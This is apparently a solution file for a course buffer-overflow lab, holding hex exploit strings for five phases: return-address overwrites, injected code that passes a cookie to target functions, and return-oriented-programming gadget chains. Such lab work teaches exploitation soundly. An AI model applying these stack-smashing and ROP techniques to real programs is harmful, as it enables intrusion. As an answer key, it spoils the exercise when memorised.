@@ -1,0 +1,69 @@
+Phase 1:
+
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00  //56  zero
+9c 12 40 00 00 00 00 00 //address of touch1
+
+Phase 2:
+
+48 c7 c7 af 87 f9 14 68 //cookie
+c8 12 40 00 c3 00 00 00 //push touch2
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+78 9c 63 55 00 00 00 00 //rsp hex after callq //address of first machine instruction//read this line first
+//overwrite with our first injected code
+
+Phase 3:
+
+48 c7 c7 b8 9c 63 55 68  //  the return address should be rsp from phase 2 +0x40(64 decimal)(grabbig the cookie at the bottom) into rdi is where the address of the string (the location where the code execution address is saved) then pass rdi throuhg touch3
+d9 13 40 00 c3 00 00 00 //address of touch3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+78 9c 63 55 00 00 00 00 //rsp from phase 2, read this line first  //return address
+31 34 66 39 38 37 61 66 // cookie turn into a string
+
+Phase 4:
+
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 
+7e 14 40 00 00 00 00 00 //gadget 1 popq rax 
+af 87 f9 14 00 00 00 00 //cookie Address , put cookie where rax is 
+a6 14 40 00 00 00 00 00 //gadget 2 mov rax,edi // there is a c3 at that address
+c8 12 40 00 00 00 00 00 //touch2
+
+
+
+Phase 5:
+
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+da 14 40 00 00 00 00 00 //Mov %rsp, %rax
+a6 14 40 00 00 00 00 00//Mov %rax, %rdi
+99 14 40 00 00 00 00 00 //pop rax
+48 00 00 00 00 00 00 00 
+02 15 40 00 00 00 00 00//Movl %eax, %ecx 
+4b 15 40 00 00 00 00 00//Movl %ecx, %edx
+1d 15 40 00 00 00 00 00 //Movl %edx, %esi 
+b1 14 40 00 00 00 00 00//Lea (%rdi, %rsi, 1), %rax
+a6 14 40 00 00 00 00 00//Mov %rax, %rdi
+d9 13 40 00 00 00 00 00//Touch3's address
+31 34 66 39 38 37 61 66//Cookie string
